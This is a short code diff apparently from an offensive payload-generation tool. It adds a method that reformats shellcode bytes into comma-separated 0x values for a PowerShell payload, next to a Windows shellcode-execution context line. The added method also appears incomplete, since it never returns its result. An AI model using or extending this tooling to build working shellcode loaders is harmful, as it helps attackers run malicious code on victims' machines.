@@ -216,6 +216,17 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 class FUNCTIONS(object):
 
+    def powershellShellcodeLayout(self):
+        powershellShellcode = re.sub(r'\\x', '0x', powershellExec)
+        count = 0
+        newpayloadlayout = ''
+        for char in powershellShellcode:
+            count += 1
+            newpayloadlayout += char
+            if count == 4:
+                newpayloadlayout += ','
+                count = 0
+
     def CheckInternet(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
